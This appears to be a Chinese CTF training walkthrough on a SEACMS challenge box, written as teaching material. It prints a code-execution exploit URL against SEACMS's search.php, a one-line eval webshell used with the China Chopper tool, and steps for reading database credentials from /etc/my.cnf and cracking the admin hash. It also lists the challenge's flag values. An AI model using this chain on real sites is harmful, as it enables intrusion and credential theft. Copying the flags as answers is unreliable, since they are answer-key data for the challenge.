**文章来源：知了堂冯老师原创**

![v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.j](https://pic4.zhimg.com/80/v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.jpg)

0x00 介绍

很早就想整一套CTF系列，苦于没法挤出时间，但是最近接收到很多高校和企业的学员想参加网络安全大赛，在这里我把心得和大家分享下，技术有限，请大家多多包涵。还是那句话，任何工具使用均来自互联网，涉及到的技术仅用于教学，不得用于非法用途，请让我们为国家安全奉献自己的绵薄之力。

接下来，我们直接来真的！

0x01实战

实战此题如下：

![v2-c743bfd72df04f610b89367cad74e4f3_hd.j](https://pic4.zhimg.com/80/v2-c743bfd72df04f610b89367cad74e4f3_hd.jpg)

此道题一共需要拿到5个flag，从哪里入手呢？

**第一步：首先我们打开连接地址:**[http://202.0.0.206](https://link.zhihu.com/?target=http%3A//202.0.0.206)

![v2-8f1275d016062550efe93f3818535ac6_hd.j](https://pic3.zhimg.com/80/v2-8f1275d016062550efe93f3818535ac6_hd.jpg)

 **第二步：漏洞分析**

根据分析，此道题是一个SEACMS的平台系统

该版本通过其他论坛平台了解到存在一个代码执行漏洞。Exp:/search.php?searchtype=5&tid=&area=phpinfo()。我们来试试此漏洞能够利用，直接在后面的phpinfo()就可以执行任意php代码直接访问http://
202.0.0.206/search.php?searchtype=5&tid=&area=phpinfo()发现phpinfo()执行成功了，说明该漏洞存在。

![v2-ea663ec90ca300fc1df4472e3515834d_hd.j](https://pic2.zhimg.com/80/v2-ea663ec90ca300fc1df4472e3515834d_hd.jpg)

我们尝试看看源码中有没有flag，右键打开此页面的源码，在源码果然有一个flag=
flag1{ac727d1a3130e4093b3665120a3240a5}

![v2-d7d763bcefc49a886f2bdecc70768406_hd.j](https://pic3.zhimg.com/80/v2-d7d763bcefc49a886f2bdecc70768406_hd.jpg)

 **第三步：一句话木马利用**

接下来我们利用一句话木马来利用。

使用使用exp：/search.php?searchtype=5&tid=&area=eval($_POST[simple])构造一句话小马。

![v2-1c41490e9ca87d3a57323d000465c8b8_hd.j](https://pic1.zhimg.com/80/v2-1c41490e9ca87d3a57323d000465c8b8_hd.jpg)

打开工具菜刀，在地址栏中填写

[http://202.0.0.206/search.php?searchtype=5&tid=&area=eval](https://link.zhihu.com/?target=http%3A//202.0.0.206/search.php%3Fsearchtype%3D5%26tid%3D%26area%3Deval)($_POST[simple]),密码为simple，点击添加

![v2-446a55dd5804a938b4b6c5f81277b89c_hd.j](https://pic1.zhimg.com/80/v2-446a55dd5804a938b4b6c5f81277b89c_hd.jpg)

连接成功了，如下：

![v2-759b9a07f59af104b49dda455cf943aa_hd.j](https://pic3.zhimg.com/80/v2-759b9a07f59af104b49dda455cf943aa_hd.jpg)

 **第四步：胡乱捣腾**

接下来就是耗时的去找了，如小偷进家，没有目的只能胡乱的翻了！

费时很久在 /home目录下发现有key文件，打开文件，获得flag2=

flag2{6634eaf4ce34a82da12d835c1ed86a24}

![v2-88accb7245028299daec582133b9cd7a_hd.j](https://pic3.zhimg.com/80/v2-88accb7245028299daec582133b9cd7a_hd.jpg)

在
/etc目录下的my.cnf关于数据库mysql的配置文件。发现flag3和数据库相关账户信息。flag3{da04113d21f02f0ebfd281d0a7a64e34}，并且得到了数据库的密码。

![v2-d6f98a42192c2ab0636469511fe871b2_hd.j](https://pic3.zhimg.com/80/v2-d6f98a42192c2ab0636469511fe871b2_hd.jpg)

 **第五步：数据库操作**

在上一步获取到关于数据库的用户名和密码，使用用户名和密码，重新配置菜刀，连接数据库。

![v2-a3c227081cb2cd13ee49791bd1b95293_hd.j](https://pic4.zhimg.com/80/v2-a3c227081cb2cd13ee49791bd1b95293_hd.jpg)

提交打开数据库，在seacms中的flag表中，找到一个flag= flag4{32730c5cc0bd7bb8ffde4457649fd409}

![v2-5ee62d6941bf411c4d7b420ba4fc988a_hd.j](https://pic3.zhimg.com/80/v2-5ee62d6941bf411c4d7b420ba4fc988a_hd.jpg)

分别在数据库中查询seacms的后台的账号密码

SELECT `name` FROM `sea_admin`

SELECT `password` FROM `sea_admin`

![v2-5fdd4877e269a0c5277dd7534515b134_hd.j](https://pic1.zhimg.com/80/v2-5fdd4877e269a0c5277dd7534515b134_hd.jpg)

 **第六步：密码破解**

取到的密码是MD5加密，密码为：23a7bbd73250516f069d
百度MD5在线解密，发现该加密值是20位，使用了和dedecms一样的加密方式，将该加密值的前三位和最后一位去掉，就是16位的MD5加密，在线解密结果是admin123。

![v2-6b32ae8cef47b5dda334b21ce1a53168_hd.j](https://pic1.zhimg.com/80/v2-6b32ae8cef47b5dda334b21ce1a53168_hd.jpg)

 **第六步：找后台登录页面**

接下来找到网站的后台登录页面，我们这里使用DirBuster工具。

![v2-57d826341dc82aeda78485cdb0b041ec_hd.j](https://pic1.zhimg.com/80/v2-57d826341dc82aeda78485cdb0b041ec_hd.jpg)![v2-bd3199b02f3e47b05235a89a0dea04df_hd.j](https://pic4.zhimg.com/80/v2-bd3199b02f3e47b05235a89a0dea04df_hd.jpg)

使用在数据库中已经获得的用用户名和密码，登录网站后台密码是admin123。

![v2-a1de31492b550a11f008ee7668cc8a64_hd.j](https://pic1.zhimg.com/80/v2-a1de31492b550a11f008ee7668cc8a64_hd.jpg)

好了，登录成功，我们拿到了后台登录页面，并可以使用管理员账号登录。

![v2-9f89c553b3ea42e47ed178c8eb06ec56_hd.j](https://pic3.zhimg.com/80/v2-9f89c553b3ea42e47ed178c8eb06ec56_hd.jpg)

 **第七步：胡乱捣腾**

在后台逛了半天，终于在网站后台查找计划任务时，发现key5。

flag5{f01cbadfd0daee0d65c2502a38581558}

![v2-b65fbe0d2004ceb8a2aa05db61d9c6e7_hd.j](https://pic4.zhimg.com/80/v2-b65fbe0d2004ceb8a2aa05db61d9c6e7_hd.jpg)

最后，到此为止，5个flag全部找出来了，接下来我们把5个flag放入答题框。

![v2-788150c40209f3a636e4cea9f0bc8aac_hd.j](https://pic1.zhimg.com/80/v2-788150c40209f3a636e4cea9f0bc8aac_hd.jpg)

本次一次打靶成功结束，希望能够给大家一点思路！！！

本系列持续更新中，欢迎关注！有问题也可以加知了小姐姐微信噢！ChilFun-Y

信安干货，请关注专栏：<https://zhuanlan.zhihu.com/c_1142392164838404096>

